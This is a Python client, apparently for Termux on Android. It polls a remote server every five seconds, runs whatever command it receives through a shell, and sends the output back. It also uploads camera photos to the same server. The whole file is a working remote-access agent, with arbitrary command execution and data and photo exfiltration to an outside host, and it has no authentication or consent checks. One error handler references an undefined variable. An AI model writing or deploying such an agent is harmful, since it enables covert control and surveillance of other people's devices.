import os
import json
import argparse
import requests
import subprocess
from time import sleep
from datetime import datetime


hosts = ["<your-host>", "http://127.0.0.1:5000"]
endpoint = "listen"

parser = argparse.ArgumentParser(description='Termux-Remote-Client')
parser.add_argument('-l', '--local', help='Sends command to localhost', required=False)

args = parser.parse_args()
if args.local:
    host = hosts[1]
else:
    host = hosts[0]


def executeCommand(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f"Command execution failed with error: {e.output}"


def sendData(data):
    endpoint = "sendlogs"
    result = requests.post(f"{host}/{endpoint}", data=data)
    response = result.json()
    print(response)


def getDate():
    now = datetime.now()
    date_format = now.strftime("%Y-%m-%d:%H:%M:%S")
    return date_format


def uploadImage(filePath):
    endpoint = "upload"
    try:
        with open(filePath, 'rb') as file:
            files = {'file': file}
            response = requests.post(f"{host}/{endpoint}", files=files)
            return response.text
    except FileNotFoundError:
        return f"File '{filePath}' not found."
    except IOError:
        return f"Error reading file '{file_path}'."
    except requests.exceptions.RequestException as e:
        return f"Error uploading file: {e}"


def listen():
    while True:
        sleep(5)
        result = requests.get(f"{host}/{endpoint}")
        response = result.json()
        command = response["command"]
        if command == "null":
            continue
        else:
            print(f"Command: {command}")
            output = executeCommand(command)
            print(output)
            commandArgv = command.split(" ")
            if commandArgv[0] == "termux-camera-photo":
                uploadImage(filePath=commandArgv[-1])
                payload = {
                    "command": f"{command}",
                    "date": getDate(),
                    "body": f"image upload: {commandArgv[-1]}"
                }
                sendData(payload)
                continue
            payload = {
                "command": f"{command}",
                "date": getDate(),
                "body": f"{output}"
            }
            sendData(payload)


if __name__ == "__main__":
    listen()